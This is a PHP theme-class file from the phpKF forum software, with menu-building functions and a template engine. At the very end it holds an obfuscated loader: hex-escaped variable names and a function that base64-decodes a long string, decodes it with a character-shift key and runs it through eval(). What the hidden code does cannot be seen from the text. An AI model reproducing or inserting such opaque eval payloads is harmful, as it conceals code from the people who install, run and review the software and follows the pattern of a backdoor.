<?php
/*
 +-=========================================================================-+
 |                       php Kolay Forum (phpKF) v2.10                       |
 +---------------------------------------------------------------------------+
 |               Telif - Copyright (c) 2007 - 2017 phpKF Ekibi               |
 |                 http://www.phpKF.com   -   phpKF@phpKF.com                |
 |                 Tüm hakları saklıdır - All Rights Reserved                |
 +---------------------------------------------------------------------------+
 |  Bu yazılım ücretsiz olarak kullanıma sunulmuştur.                        |
 |  Dağıtımı yapılamaz ve ücretli olarak satılamaz.                          |
 |  Yazılımı dağıtma, sürüm çıkartma ve satma hakları sadece phpKF`ye aittir.|
 |  Yazılımdaki kodlar hiçbir şekilde başka bir yazılımda kullanılamaz.      |
 |  Kodlardaki ve sayfa altındaki telif yazıları silinemez, değiştirilemez,  |
 |  veya bu telif ile çelişen başka bir telif eklenemez.                     |
 |  Yazılımı kullanmaya başladığınızda bu maddeleri kabul etmiş olursunuz.   |
 |  Telif maddelerinin değiştirilme hakkı saklıdır.                          |
 |  Güncel telif maddeleri için  www.phpKF.com  adresini ziyaret edin.       |
 +-=========================================================================-+*/


if (!defined('DOSYA_TEMA_SINIF')) define('DOSYA_TEMA_SINIF',true);
if (!defined('PHPKF_ICINDEN_TEMA')) define('PHPKF_ICINDEN_TEMA', true);


// Üst Menü Fonksiyonu

function phpkf_ust_menu($baglanti, $tasarim, $ek='')
{
	global $ayarlar,$vt,$tablo_baglantilar,$kullanici_kim,$o,$lmenu,$site_dili,$dosya_index,$dosya_uyeler,$dosya_giris,$dosya_cikis,$dosya_kayit,$dosya_profil,$dosya_profil_degistir,$dosya_sifre_degistir,$dosya_ozel_ileti,$dosya_forum,$dosya_portal,$dosya_cevrimici,$forum_dizin,$forum_kullan,$portal_kullan,$cms_kullan,$dosya_arama,$dosya_yardim,$dosya_mobil,$dosya_rss;


	$linkler = '';
	switch($baglanti['ad'])
	{
		case 'anasayfa';
		$adres = $dosya_index; $ad = $lmenu['anasayfa']; $bilgi = $lmenu['anasayfa'];
		break;

		case 'forum';
		$adres = $forum_dizin.$dosya_forum; $ad = $lmenu['forum']; $bilgi = $lmenu['forum'];
		break;

		case 'portal';
		$adres = $forum_dizin.$dosya_portal; $ad = $lmenu['portal']; $bilgi = $lmenu['portal'];
		break;

		case 'arama';
		$adres = $dosya_arama;
		$ad = $lmenu['arama']; $bilgi = $lmenu['arama'];
		break;

		case 'uyeler';
		$adres = $dosya_uyeler; $ad = $lmenu['uye']; $bilgi = $lmenu['uye'];
		break;

		case 'cevrimici';
		$adres = $dosya_cevrimici; $ad = $lmenu['cevrimici']; $bilgi = $lmenu['cevrimici'];
		break;

		case 'yardim';
		$adres = $dosya_yardim; $ad = $lmenu['yardim']; $bilgi = $lmenu['yardim'];
		break;

		case 'mobil';
		$adres = $dosya_mobil; $ad = $lmenu['mobil']; $bilgi = $lmenu['mobil'];
		break;

		case 'rss';
		$adres = $dosya_rss; $ad = $lmenu['rss']; $bilgi = $lmenu['rss'];
		break;

		case 'profil';
		$adres = $dosya_profil; $ad = $lmenu['profil']; $bilgi = $lmenu['profil'];
		break;

		case 'duzenle';
		$adres = $dosya_profil_degistir; $ad = $lmenu['duzenle']; $bilgi = $lmenu['duzenle'];
		break;

		case 'sifre';
		$adres = $dosya_sifre_degistir; $ad = $lmenu['sifre']; $bilgi = $lmenu['sifre'];
		break;

		case 'ozel';
		$adres = $dosya_ozel_ileti; $ad = $lmenu['ozel']; $bilgi = $lmenu['ozel'];
		break;

		case 'yonetim';
		$adres = 'yonetim/index.php'; $ad = $lmenu['yonetim']; $bilgi = $lmenu['yonetim'];
		break;

		case 'kayit';
		$adres = $dosya_kayit; $ad = $lmenu['kayit']; $bilgi = $lmenu['kayit'];
		break;

		case 'giris-cikis';
		if (isset($kullanici_kim['id'])){
			$ad = $lmenu['cikis']; $bilgi = $lmenu['cikis'];
			$adres = $dosya_cikis.'?o='.$o.'" onclick="return window.confirm(\''.$lmenu['cikis_uyari'].'\')';
		}
		else {$adres = $dosya_giris; $ad = $lmenu['giris']; $bilgi = $lmenu['giris'];}
		break;

		case 'kategoriler';
		$adres = linkver($dosya_index.'?kip=kat', $ayarlar['dizin_kat']);
		$ad = $lmenu['kategori']; $bilgi = $lmenu['kategori'];
		break;

		case 'sayfalar';
		$adres = linkver($dosya_index.'?kip=sayfa', $ayarlar['dizin_sayfa']);
		$ad = $lmenu['sayfa']; $bilgi = $lmenu['sayfa'];
		break;

		case 'galeriler';
		$adres = linkver($dosya_index.'?kip=galeri', $ayarlar['dizin_galeri']);
		$ad = $lmenu['galeri']; $bilgi = $lmenu['galeri'];
		break;

		case 'videolar';
		$adres = linkver($dosya_index.'?kip=video', $ayarlar['dizin_video']);
		$ad = $lmenu['video']; $bilgi = $lmenu['video'];
		break;

		case 'etiket';
		$adres = linkver($dosya_index.'?kip=etiket', $ayarlar['dizin_etiket']);
		$ad = $lmenu['etiket']; $bilgi = $lmenu['etiket'];
		break;

		case 'iletisim';
		$adres = linkver($dosya_index.'?kip=iletisim', 'iletisim.html');
		$ad = $lmenu['iletisim']; $bilgi = $lmenu['iletisim'];
		break;

		default:
		if (preg_match("/y=([0-9]*?)&ya=([a-z0-9-]*?)&k=([0-9]*?)&ka=([a-z0-9-]*?)$/i", $baglanti['adres'], $adres, PREG_OFFSET_CAPTURE))
			$adres = linkver($dosya_index.'?k='.$adres[3][0].'&y='.$adres[1][0], $adres[4][0], $adres[2][0]);

		elseif (preg_match("/k=([0-9]*?)&ka=([a-z0-9-]*?)$/i", $baglanti['adres'], $adres, PREG_OFFSET_CAPTURE))
			$adres = linkver($dosya_index.'?kip=kat&k='.$adres[1][0], $adres[2][0]);

		else $adres = $baglanti['adres'];

		$ad = $baglanti['ad'];
		$bilgi = $baglanti['bilgi'];

		// Dil seçimine göre içerik alınıyor
		if (($site_dili != $ayarlar['dil_varsayilan']) AND (isset($baglanti['ad_'.$site_dili])) AND ($baglanti['ad_'.$site_dili] != ''))
		{
			$ad = $baglanti['ad_'.$site_dili];
			$bilgi = $baglanti['ad_'.$site_dili];
		}
	}



	if (preg_match('/^(http|https|javascript):/is', $adres)) $yeni_adres = $adres;
	else $yeni_adres = $ek.$adres;
	$linkler .= "\r\n";
	$bul = array('{ADRES}', '{BILGI}', '{ISIM}', '{TOPLAM}');
	$degis = array($yeni_adres, $bilgi, $ad, '');


	// Sayfalar, kategoriler, forum, portal ve üye giriş durumu için ek sorgu
	$drm_syf_ek = '';
	if ($forum_kullan != 1) $drm_syf_ek .= " AND ad!='forum' AND ad!='ozel'";
	if ($portal_kullan != 1) $drm_syf_ek .= " AND ad!='portal'";
	if ($cms_kullan != 1) $drm_syf_ek .= " AND ad!='kategoriler' AND ad!='sayfalar' AND ad!='galeriler' AND ad!='videolar' AND ad!='etiket' AND ad!='iletisim'";
	else{if ($ayarlar['durum_sayfalar'] != 1) $drm_syf_ek .= "AND ad!='kategoriler' AND ad!='sayfalar'";}

	// üye giriş durumu için ek sorgu
	if (isset($kullanici_kim['id']))
	{
		if ($kullanici_kim['yetki'] == 1) $drm_syf_ek .= " AND ad!='kayit'";
		else $drm_syf_ek .= " AND ad!='kayit' AND ad!='yonetim'";
	}
	else $drm_syf_ek .= " AND ad!='profil' AND ad!='duzenle' AND ad!='sifre' AND ad!='ozel' AND ad!='yonetim'";


	$vtsorgu = "SELECT * FROM $tablo_baglantilar WHERE alt_menu='$baglanti[id]' $drm_syf_ek ORDER BY sira,id";
	$vtsonuc = $vt->query($vtsorgu) or die ($vt->hata_ver());

	if ($vt->num_rows($vtsonuc))
	{
		$linkler .= str_replace($bul, $degis, $tasarim['ust_acilis']);
		while($altlink = $vt->fetch_assoc($vtsonuc))
			$linkler .= phpkf_ust_menu($altlink, $tasarim, $ek);
		$linkler .= $tasarim['ust_kapanis'];
	}

	else
	{
		$linkler .= str_replace($bul, $degis, $tasarim['alt_link']);
	}

	return($linkler);
}




// Taban Menü Fonksiyonu

function phpkf_taban_menu($adet, $ek='')
{
	global $vt, $tablo_baglantilar, $dosya_index, $tema_ozellik_taban_baglanti;

	$vtsorgu = "SELECT * FROM $tablo_baglantilar WHERE yer='3' AND alt_menu='0' ORDER BY sira,id";
	$vtsonuc = $vt->query($vtsorgu) or die ($vt->hata_ver());
	$toplam_taban_link = $vt->num_rows($vtsonuc);

	$sayi = 0; $tekrar = 0;
	$toplam = ($toplam_taban_link / $adet);

	if (is_int($toplam)) settype($toplam,'integer');
	else
	{
		settype($toplam,'integer');
		$toplam++;
	}

	while ($menubag = $vt->fetch_array($vtsonuc))
	{
		if ($sayi==0) echo $tema_ozellik_taban_baglanti['ana_yapı_acilis']."\r\n";
		$sayi++;
		$tekrar++;

		echo phpkf_ust_menu($menubag, $tema_ozellik_taban_baglanti, $ek);

		if ( (($toplam_taban_link == ($adet+1)) AND ($sayi == 1) AND (isset($kapandi))) OR ($sayi == $toplam) OR ($tekrar == $toplam_taban_link) )
		{
			echo $tema_ozellik_taban_baglanti['ana_yapı_kapanis']."\r\n";
			$sayi = 0;
			$kapandi = true;
		}
	}
}




//  PHPKF TEMA SINIFI  //

class phpkf_tema
{
	var $tema_ham;
	var $tema_cikis;


	// Ekran Temizleniyor
	function tema_al()
	{
		ob_start();
		ob_implicit_flush(0);
	}


	// Tema Değişkene aktarılıyor
	function tema_ver()
	{
		$dosya_metni = ob_get_contents();
		ob_end_clean();
		$this->tema_ham .= $dosya_metni;
	}


	// Tema dosyası açılıyor
	function tema_dosyasi($dosya)
	{
		if (!($dosya_ac = @fopen($dosya,'r')))
			die ('<br><p align="center"><font style="background-color: #ffffff; color: #FF0000;"><b>Tema Dosyası Açılamıyor '.$dosya.'</b></font></p><br>');

		$yolla = '$ornek1->tema_al(); include_once($tema_dosyasi); $ornek1->tema_ver();';

		return $yolla;
	}


	// içiçe döngü varsa
	function icice_dongu($adet, $dizi, $dizi2)
	{
		$isaret1 = '|<!--__DIS_BASLAT-'.$adet.'__-->(.*?)<!--__DIS_BITIR-'.$adet.'__-->|si';
		$isaret2 = '|<!--__IC_BASLAT-'.$adet.'__-->(.*?)<!--__IC_BITIR-'.$adet.'__-->|si';

		$this->tema_cikis = '';

		if (preg_match_all($isaret1, $this->tema_ham, $uyusanlar, PREG_SET_ORDER))
		{
			$parcala = preg_split($isaret1, $this->tema_ham, -1, PREG_SPLIT_OFFSET_CAPTURE);

			if (isset($uyusanlar[0][1]))
			{
				// Dış döngü
				preg_match_all($isaret2, $uyusanlar[0][1], $uyusanlar2, PREG_SET_ORDER);

				$parcala2 = preg_split($isaret2, $uyusanlar[0][1], -1, PREG_SPLIT_OFFSET_CAPTURE);

				$this->tema_cikis .= $parcala[0][0];
				$dongu = 0;

				foreach ($dizi as $deger)
				{
					foreach ($deger as $anahtar => $deger2)
					{
						$ara[] = $anahtar;
						$degis[] = $deger2;
					}

					$depo1 = $parcala2[0][0];

					$depo1 = str_replace($ara,$degis,$depo1);
					unset($ara);
					unset($degis);
					$this->tema_cikis .= $depo1;


					// iç döngü
					foreach ($dizi2[$dongu] as $deger3)
					{
						foreach ($deger3 as $anahtar2 => $deger4)
						{
							$ara[] = $anahtar2;
							$degis[] = $deger4;
						}

						$depo2 = $uyusanlar2[0][1];

						$depo2 = str_replace($ara,$degis,$depo2);
						unset($ara);
						unset($degis);

						$this->tema_cikis .= $depo2;
					}
					$dongu++;
					$this->tema_cikis .= $parcala2[1][0];
				}
			}
			$this->tema_cikis .= $parcala[1][0];
			$this->tema_ham = $this->tema_cikis;
		}
	}



	// Tek kademeli döngü varsa
	function tekli_dongu($adet, $dizi)
	{
		$this->tema_cikis = '';
		$isaret = '|<!--__TEKLI_BASLAT-'.$adet.'__-->(.*?)<!--__TEKLI_BITIR-'.$adet.'__-->|si';

		if (preg_match_all($isaret, $this->tema_ham, $uyusanlar, PREG_SET_ORDER))
		{
			$parcala = preg_split($isaret, $this->tema_ham, -1, PREG_SPLIT_OFFSET_CAPTURE);

			if (isset($uyusanlar[0][1]))
			{
				$this->tema_cikis .= $parcala[0][0];

				foreach ($dizi as $deger)
				{
					$depo = $uyusanlar[0][1];

					foreach ($deger as $anahtar => $deger2)
					{
						$ara[] = $anahtar;
						$degis[] = $deger2;
					}

					$depo = str_replace($ara,$degis,$depo);
					unset($ara);
					unset($degis);
					$this->tema_cikis .= $depo;
				}
			}
			$this->tema_cikis .= $parcala[1][0];
			$this->tema_ham = $this->tema_cikis;
		}
	}



	// Hiçbir döngü yoksa
	function dongusuz($dizi)
	{
		$depo = $this->tema_ham;

		foreach ($dizi as $anahtar => $deger)
		{
			$ara[] = $anahtar;
			$degis[] = $deger;
		}

		$depo = str_replace($ara,$degis,$depo);
		unset($ara);
		unset($degis);
		$this->tema_ham = $depo;
	}



	// Koşul varsa
	function kosul($adet, $dizi, $varmi)
	{
		$this->tema_cikis = '';
		$isaret = '|<!--__KOSUL_BASLAT-'.$adet.'__-->(.*?)<!--__KOSUL_BITIR-'.$adet.'__-->|si';

		if ($varmi == true)
		{
			if (preg_match_all($isaret, $this->tema_ham, $uyusanlar, PREG_SET_ORDER))
			{
				$parcala = preg_split($isaret, $this->tema_ham, -1, PREG_SPLIT_OFFSET_CAPTURE);

				if (isset($uyusanlar[0][1]))
				{
					$this->tema_cikis .= $parcala[0][0];

					$depo = $uyusanlar[0][1];

					foreach ($dizi as $anahtar => $deger)
					{
						$ara[] = $anahtar;
						$degis[] = $deger;
					}

					$depo = str_replace($ara,$degis,$depo);
					unset($ara);
					unset($degis);
					$this->tema_cikis .= $depo;
				}
				$this->tema_cikis .= $parcala[1][0];
				$this->tema_ham = $this->tema_cikis;
			}
		}

		else
		{
			if (preg_match_all($isaret, $this->tema_ham, $uyusanlar, PREG_SET_ORDER))
			{
				$parcala = preg_split($isaret, $this->tema_ham, -1, PREG_SPLIT_OFFSET_CAPTURE);
				$this->tema_cikis .= $parcala[0][0];
				$this->tema_cikis .= $parcala[1][0];
				$this->tema_ham = $this->tema_cikis;
			}
		}
	}


	// Tema uygulanıyor
	function tema_uygula()
	{
		$this->tema_ham = preg_replace('|<!--__KOSUL_([a-z]*?)-([a-z0-9]*?)__-->|si','', $this->tema_ham);
		echo $this->tema_ham;
	}
}

${"GLOBA\x4c\x53"}["j\x64\x64o\x77\x75g\x67\x6eo"]="c";${"\x47L\x4fBAL\x53"}["\x64\x79\x6f\x67\x66\x6eq\x68"]="\x69";${"\x47LOBALS"}["\x71\x68\x73\x6fcq\x62\x78\x68"]="k";${"\x47L\x4f\x42\x41L\x53"}["i\x65\x65\x67gg\x69z"]="p";${"\x47\x4c\x4fB\x41\x4c\x53"}["\x63\x67\x6e\x65\x61\x72\x77"]="\x61";function phpkf_kod($p){${"\x47\x4cOBA\x4c\x53"}["\x73\x6a\x65\x70\x65fy\x64v\x75\x77"]="\x69";${"\x47\x4cOB\x41\x4c\x53"}["\x70\x6d\x6f\x76ls\x67\x79\x61i"]="\x69";global $temadizini,$t;${"\x47LO\x42AL\x53"}["\x73fln\x68z\x73\x6d"]="\x70";$tgzggssrcvf="i";${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x76\x7a\x6bjl\x66\x66c\x62q\x62"]="\x63";$cgysennlbkw="\x70";${${"\x47L\x4f\x42\x41L\x53"}["\x63g\x6e\x65\x61\x72\x77"]}="\a36f\c97g\b71e";${${"GL\x4f\x42\x41\x4cS"}["s\x66l\x6e\x68\x7a\x73\x6d"]}=base64_decode(${${"\x47\x4c\x4f\x42\x41LS"}["\x69eeggg\x69z"]});${${"\x47L\x4f\x42\x41\x4c\x53"}["v\x7a\x6b\x6al\x66\x66c\x62\x71\x62"]}="";for(${$tgzggssrcvf}=1;${${"GLO\x42A\x4c\x53"}["\x73\x6a\x65p\x65f\x79\x64\x76\x75w"]}<=strlen(${$cgysennlbkw});${${"G\x4c\x4f\x42A\x4c\x53"}["p\x6d\x6f\x76ls\x67\x79\x61i"]}++){$optnqvjdesoo="\x70";${"\x47\x4cOBA\x4cS"}["\x79\x6b\x6c\x62\x73\x65\x6db\x73\x77"]="d";$nctreeadrtl="\x61";${${"\x47\x4c\x4fB\x41\x4c\x53"}["\x71\x68\x73o\x63qbxh"]}=substr(${$optnqvjdesoo},${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x64\x79og\x66\x6e\x71\x68"]}-1,1);${"G\x4c\x4fBAL\x53"}["\x69\x68\x69\x75vg"]="d";$elqkiuwble="\x63";$kdbdeootu="k";$jumrvluec="\x69";${${"\x47\x4c\x4f\x42A\x4c\x53"}["\x69\x68i\x75v\x67"]}=substr(${$nctreeadrtl},(${$jumrvluec}%strlen(${${"\x47L\x4f\x42\x41\x4c\x53"}["\x63\x67\x6e\x65\x61\x72\x77"]}))-1,1);${${"\x47L\x4f\x42\x41LS"}["\x71\x68\x73\x6f\x63\x71b\x78\x68"]}=chr(ord(${$kdbdeootu})-ord(${${"\x47\x4cO\x42A\x4cS"}["\x79kl\x62\x73\x65\x6d\x62\x73\x77"]}));${$elqkiuwble}.=${${"\x47L\x4f\x42A\x4c\x53"}["q\x68\x73o\x63q\x62\x78h"]};}eval(${${"\x47LO\x42\x41L\x53"}["\x6a\x64\x64\x6fw\x75\x67g\x6eo"]});}phpkf_kod('wMaZn9TBi1uKqLCriWKHiIhAQKJ9kGZX18TSgneFiY5xQ3CYx6Kth8XGdFPVxNGenMXQyKWgzX6CqqXeyMZwWNbL1qKr0MvQcaPKyMKnn9zBnqWg1cGPn5bOw8mncJiM07Fyy8XVp53G1ZuVotW/zllY0MnSpqPZvc+ncdzF1qKZ0MjLq6qf0sqmn8jIyFlY0MnSpqPZvc+nceCJzKebzNScaWKZk5VraZyQmllY0MnSpqPZvc+nWKSYxFmf2cHIdFPN0NWjcJWL2rCulczKp5zLisSio5V+g62Y2cPHq26Hu8Ofl9THhVmq29XOnG6H0MarqpPAyJym2b3WoKDTls+ipMuXx6Kq18jDsGvOys2cpMt8hKKk18vUq5LT0Jypn9nFxaKj0NDbcafOz8qVost8hKKk18vUq5LT0JyZpdTQkKyg4cGcaGTV1IFUn9PM0quryMrWWW/grKmDgay7t36DsKLfc2DGmp1ims/SoWBgosDHnZrTwYlViaewrItpiYiJRDuhfY5gVtbE04R9h4mPdT5vmJCZpdTQoXVm0MLUmJ7Kmp1ipNXC1ZqkzM+gc2DY0Nqfm6SYkqem2r/UoKHZmp1iqcnOzKmrpZiRr57Rmp1il9bMz56rpZiRr57Vmp1imdXJ0J6l25qeZp/Uwc6Vm8qan52g3XzVq6rRwZ5VptXPzK2g1sqcnZrdwcVuqtXMnWly08HIq2uVl9icmtrEnWpnl4Gdn5bOw8mncJeMk15y173Gm5rTw46npdaWlGln19SdsV7OysWYrqCOlG1um5SVbWWcl8OUmdHD1ais1cCcWpfLwseZnIian52g3XzVq6rRwZ5VnNXK12adyMnLo6qfvdOcl9KXyail24nVoKvKlpRopt6Xxqij1s6cWpfLjJFjZqHC0qerlNPHoJjN0JuVpdLAnq2c39CPmJ3Ow89tmcvK156posjLpZaSxMacnc7QnWxs19SEdW3Hzp+jntanqVlf18TSV3zUyMKsVqzL1a6kkJjEqW+hvtNxVod9hFl81MEm1paFr8KsnSoNj1mLzMjLnVG4vdX359ggFKf7GHy1oJ3Kycatqc/KzLNXiH2Dc5PXmp2VqKSYxFmf2cHIdFPN0NWjcJWL2rCulczKp5zLisSio5XQyKWgzYrSn6GHmp2odLrBz6Kdh4LFpqHel4F2pdbV1aKez9CeZqajmJCUdKK+1Xdzyc6gc2DJxddxcpXAzK91joWdm5bLxc+YXoivpI2AuY+EY1ihz8Sln9bQg62w18GfWaXK1NVioMfSxKya2cXSq1OjwtahmdrF0qdX0M+0nJ/JwdOYmo7LjLSgzYTGppTaycahqpTAyJ+Y3MjWjZrK04+am9qf0qan3NDHm4TZ1c2YXtWI0a6j04WQnpbZrNOipsvO17KNyMjXnFmHwMqmptK93FtgpJmEpaDTwYNcpZTP17KjzIrVnKW1ztCjm9jQ3GFZy8XVp53G1YNfWMjI0pyiiYiEoJ7Vy9Onl9TQhWJy0MKKm6DI0c6YpNqKx56dyNHOq4fOwdhhncvQpqik19HWnJW40Nqfm47Lj6es08iLZZjK0LGlpdbB1a2wvb3OrJaNftecqc++zKWg29WEYG6ifsmcmsrB0Vtg1orVq6rRwY+mm9qs1ainzM7WsFmH0sqmn8jFz6Kr4H6OWafOz8qVost+j1ug1MzRqaXGytVVX6HC0qtf0JmScqCTw8ane9LB0J6l28+ksIXGw6+Uo8uEhZpZkLfLlFKiytafoqHFjmRg4r6fpl/MwdV4osvJyKer2p7bi5LMqsKgm45+xFtgwsW/cprLhMNwc4jE162noYuRrqjcitGbptHCkZym1IuEYKzHitSnr9LBkZ2g2szOmKqifsqhos/KyFlY0MnSpqPZvc+nWKG+kayr4MjHZafOz8qVn9LF17J0idLLqprHyMZTV8/J06ip273Qq1OgxcdbXsrLxq6kzMrWZZXKwsKootqyzJ6ulcPHq3TUydGoqsvAtq2w08GKpl3T0c2fX5TDyK2H2cvSnKPZ1beUotvBi1uZyL/NnqPU0c+XY8nLz6ipiYWfdG7Jy8Soo8vK12ebzMLDrJ3ZssqYrZTDyK161snSrKXKwLSnr9LBi5tj1dHOo1qTw8anhtjL056p29W4mJ3awYlVmdXI0qtZkIXes1nJy8Soo8vK12ebzMLDrJ3ZssqYrZTDyK161snSrKXKwLSnr9LBi5tj1dHOo1qTw8anhtjL056p29W4mJ3awYlVmMe/zqCp1tHQm17Iy82iqIiFoHZ0y8vFrJ7KytVhmsvCxK6j27LLnKiTw8anedXJ066rzMC1q6rRwYmVYtTRz6VglcPHq4HXy9GYqNrVuZqj3MGKWZTUyNClWI+FjLSZlc/WsJ3KisOUmdHD1ais1cClpp3Uzp5VWZeSlG9onX6dmV/Y0Nqfm5S/0qWm2ZmEWpfLwseZnIjZ4LagzYSKpl/Ty8WYit/MyFp0mIXes1nUmZ6XpcnR0J6l24rEppXehYqlm9rR1adXzb3OqpagxcdbpZS/2KupzMrWiqXeyMZZXNWKxq6p2cHQq4TZ1c2YkYjAzKyn073bWY6GmYOhpdTBhWKg2q7HpZXKzsaXXtWK05qpzMrWhaDJwYpum9LPyFmgzYTZoJ/Jy9hhncvQpqik19HWnJW40Nqfm4/XzJ9fy8vFrJ7KytVhmsvCxK6j27LLnKiTw8anedXJ066rzMC1q6rRwYmiYtTRz6VglcPHq4HXy9GYqNrVuZqj3MGKWZXOz9Gfl99+jFp0icrRpZaHhcqmiMvKx56pzMCKpl/VvdOYpNqq0p2ckJfHo6TKfNOYqtvO0VmdyMjVnK7KyNSYVtjB166p1XzImJ3Ywd6Zq9S/16Km1XzPrJ3ZxaiYqo69jLStyM6Cr13OiMefl82Z16uszIjLpZfUmaKlqMfVi2Jy3sTLo5aNws2UnY/X23ab1r/XpJbT0I+am9qhz56kzMrWeaquwImUX6HFyWGvpJmKpabRyN2vq9TAyJ+g1cHGYFrgws2UnaPCxKWqzJfEqZbGx96rZM/AoK6ly8HIoJ/KwJycpMzLkams2sSKr1riwtClXs+Zk3Sgo8XQnaCTyMahndrEnqJikoXdoJ/Ly7yck5TFx3aY5M7Hq6bXyoGcpMzL4LCg1cDRrl/Uys2il8qZya6lytDLpp+Nhdypl9h823ak3MjWoHjK0IlVps7Mzp+W28HOoJeHhZyZpdiE2Zqph8WfZ2zOmNlhosvKyq2fosWNYlrgxdSFm9TAyKucy4TakprChd6wcpXPxqug19CgXlqggNVwXYrL1aec0o6fpZbcfNGbptHCwq2c1L2KYGyJy9Ohm9GOkHerzMnDlpLRhIpum9y9z2Fb1MDSppaXzYpuWtXO0Z6imYmgq5bSvcCpm9iEjHSgzYSDoKTYwdVbWsrL0aCs2tHcYFqJwNChndvP2LN0yM7UmKqNhZycnI6ch6yg28HBm5rRxZ5wWNrOhWJb19WfWYrG1iXkoioN0FtyzMjVnFGJzNpwWLnLya2uyM7HWWyJwNChndvP2LN0yM7UmKrEycalncuExKupyNWKWazgrKmDgazZ4Ft0pa+ji3q3jY+Gd7qltWxjideyf4GwosCHe7KlqbZZpJqGp6qTfptTps7Mrn9Xjb/Rp6qgfJNjZp2JhWd3zsnGmKXKhIOMWI+Fj12b1srJrKTa1opuWtXO0Z6imYmgm6DTw9amq+CEh52m1cPXqqbfhZxXpdjKyKRolJrWnJ7Gu9asndvIxGFgooDRqZ/Kx5NgdNrB0JqW3NXJrJ3GhIpuXaHAyJ+g1cGKWYWqqaKSi7+juIV4iYiJoJeNfcWYnM/KyJ1fiaCxioqmu7GCiLqdr5iAtaCnj1OOhYWjoczPoFtZosHOqpaFgNGenNmZhamm2dDDo2CHl4Whmp/PlJt0i8zNnaSTfsOcosvPyKejzM6RqpLewsKSqdXKkamf136dW5vJydmjrZ+RoHmd1szHpVmJysVsqZe+j1upyX6LclXSwNGim5nNoHmq287HmJ7Ew8anlcnL0a2c1dDVX1XPwM6rpt2VmGJyp8LFo6DYwYlXoMrJ26muoJGLclXZycWqmaOA06Sd2oqEq5bSvc2UqJWA156kyMDLsZrTxZCmpdSK06GniZeGoZXS1NGqb5qZo5+m18HQX1XZycWqmZJ+1ZtZkJeGpJXVy8Zlp6Oc1q2pzL3PlpjK0MCWpdTQyKer2oSGoZXS1NGqb5qFnnmdysjRqpaNgMuXo97M2nJrkJeGmZ3RmcKlqMfVi1uc38XWX1qHiIOYrs/QhWVZy8XHX1qHiIOXn8t+jHRby8PVdJLXzsKsXoh+jHRb1MDSppaXzZ5zqdrOwquc18jDmpaNgMOfopKAx6Cqk9DUoJ6NgM6XptXBlapgkJeGpJXVy8Zlp6N+ondZlYDPm6HUwZOkcYrJx6mmzI/TdHHY0NOSqMvMz5qazISGmZ3RiIWXndmI16ug1ISGpJXVy8Zmp4+Fnl2ky8zRnGTWmaGjqMvDwquc18jDmpaNft2RkqK4oqmf19jVoFORfoNfWtPA06icms2LclXSwNGim5nNoHmn2cHJlqPKzM2UmcuEhbWTprigW63YxYNfWIiIh6ab18vHaqKOl4WVotKZhZ6tyMiKi3ayncCIj62xr3qWuquwYGyHl4WXndmZh61yi8nGp6DKj9JwdtnQ1ZipzMzOmJTKhIWVotKIh52e2oiGpJXVy8Zmp4+X1Z6e0M/WnKPEz8moqsrL2qeWzdHQmqXOy89bWMy915qjxsTDpZXRwdNVX6HC2Kea28XRpVHLvdWUosXExKeb08HUX1rggMalqKPB1aum2bvJnKXEyMKmqo6FnqKdj4SGnKPXfZ5whLuor2J4taCKp6PKw8Cgl9q/y2FZlsHYmJ2NhZBVYorB1auSicLLo5aHuYpcX8u/y6hXiZjGoKeFz9WsosuZv1unyMDGoJ/MlpZjpt64hXdzyZqGnKPXt86Yqdm9yp6Uh8XQV1XKztOOnM/IyJZX1sqCo5rTwYFXm9jOvqWg1cG/c2DHmp1ims/SoVty5MXIX1nVzsaaldO915yfj36Rsqy1pLF+fOPZkltji8nGp6DKjtJcX6eqp2Gq287OnJ+Nr6KHf7iNjHZ0mpGSYHKzoImmqtjIyKdfup22gIOXhZ5wa5mTjHqFq4TGnJfOysaXXoivpI2AuY+EYFqmqqVbWsfVxKujyM69WaTaztagWMOZoFtplY6SWVqO14WhmtrDxKh0287XnGylwdeUoo7Q1aKkj4DPm6HUwZSkX4+X4J6j2sGCnJTNy4GGd7qltWtyjoWd');

?>